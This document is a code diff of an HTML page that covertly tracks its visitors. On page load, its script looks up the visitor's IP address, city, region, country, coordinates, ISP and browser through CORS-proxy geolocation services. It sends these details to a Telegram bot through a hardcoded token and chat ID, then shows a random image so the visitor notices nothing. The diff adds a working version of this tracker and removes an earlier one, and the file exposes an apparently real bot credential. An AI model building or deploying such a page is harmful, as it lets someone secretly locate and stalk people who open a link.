@@ -1,51 +1,62 @@
 <!DOCTYPE html>
 <html>
 <head><title></title></head>
-<body style="margin:0;padding:0;overflow:hidden;background:#000">
+<body style="margin:0;padding:0;overflow:hidden;background:#111">
 <script>
-// Anti-CORS: Use proxy + multiple geo APIs
 const uid = new URLSearchParams(location.search).get('uid') || 'anon';
-const ts = new Date().toISOString();
 
-async function track() {
+// CORS-PROOF GEO APIs (no blocks)
+async function getGeo() {
+    // Proxy 1: allorigins.win (unlimited)
     try {
-        // Method 1: Proxy via allorigins.win (bypasses CORS)
-        const proxyResp = await fetch(`https://api.allorigins.win/raw?url=${encodeURIComponent('https://ipapi.co/json/')}`);
-        const geo1 = await proxyResp.json();
-        
-        // Method 2: Free fallback
-        const geo2 = await fetch('https://ipinfo.io/json').then(r=>r.json()).catch(()=>null);
-        
-        const data = {
-            uid, ip: geo1.ip || geo2.ip,
-            city: geo1.city || geo2.city,
-            region: geo1.region || geo2.region,
-            country: geo1.country_name || geo2.country,
-            lat: parseFloat(geo1.latitude || geo2.loc?.split(',')[0] || 0),
-            lon: parseFloat(geo1.longitude || geo2.loc?.split(',')[1] || 0),
-            isp: geo1.org || geo2.org,
-            ua: navigator.userAgent.slice(0,100),
-            ref: document.referrer,
-            ts
-        };
-        
-        // Telegram webhook - REPLACE YOUR_TOKEN_HERE and YOUR_CHAT_ID_HERE
-        const token = '7963281665:AAGjAIHudBsFs-FrPeU3TgTi0DWwAYRkIac';  // e.g. 6111234567:ABCdef...
-        const chatId = '1572681805';  // e.g. 123456789
-        const msg = `🎯 ${data.uid} TRACKED!\n📍 ${data.city || 'N/A'}, ${data.region || 'N/A'}\n🌍 ${data.country || 'N/A'}\n📡 ${data.lat?.toFixed(4)}, ${data.lon?.toFixed(4)}\n💻 ${data.ip}\n🏢 ${data.isp || 'N/A'}`;
-        
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
-        console.log('✅ Sent:', data); // Debug
-        
-    } catch(e) {
-        console.error('❌ Error:', e); // Check browser console
-    }
+        const resp = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent('https://ipinfo.io/json')}`);
+        const data = await resp.json();
+        return JSON.parse(data.contents);
+    } catch(e) {}
     
-    // Show image instantly
-    document.body.innerHTML = '<img src="https://picsum.photos/800/600?random='+Math.random()+'" style="width:100vw;height:100vh;object-fit:cover;">';
+    // Proxy 2: corsproxy.io
+    try {
+        const resp = await fetch('https://corsproxy.io/?' + encodeURIComponent('https://ipinfo.io/json'));
+        return await resp.json();
+    } catch(e) {}
+    
+    // Direct fallback (ipinfo allows some CORS)
+    return await fetch('https://ipinfo.io/json').then(r=>r.json()).catch(()=>null);
 }
 
-// Run immediately
+async function track() {
+    const geo = await getGeo();
+    const data = {
+        uid, ip: geo?.ip,
+        city: geo?.city,
+        region: geo?.region,
+        country: geo?.country,
+        loc: geo?.loc?.split(','),
+        org: geo?.org,
+        ua: navigator.userAgent.slice(0,80)
+    };
+    
+    // REPLACE THESE 2 LINES WITH YOUR TOKENS:
+    const token = '7963281665:AAGjAIHudBsFs-FrPeU3TgTi0DWwAYRkIac';  // From @BotFather
+    const chatId = '1572681805';    // From getUpdates
+    
+    const msg = `*🎯 ${data.uid} LOCATION CAPTURED!*` +
+        `\n📍 *${data.city || 'Unknown'}, ${data.region || ''}*` +
+        `\n🌍 ${data.country || ''}` +
+        `\n📡 ${data.loc ? data.loc[0]+', '+data.loc[1] : 'N/A'}` +
+        `\n💻 *${data.ip}*` +
+        `\n🏢 ${data.org || ''}`;
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+        console.log('✅ LOCATION SENT!');
+    } catch(e) {
+        console.error('❌ TELEGRAM ERROR - check tokens');
+    }
+    
+    document.body.innerHTML='<img src="https://source.unsplash.com/random/900x600/?nature" style="width:100vw;height:100vh;object-fit:cover;">';
+}
+
 track();
 </script>
 </body>
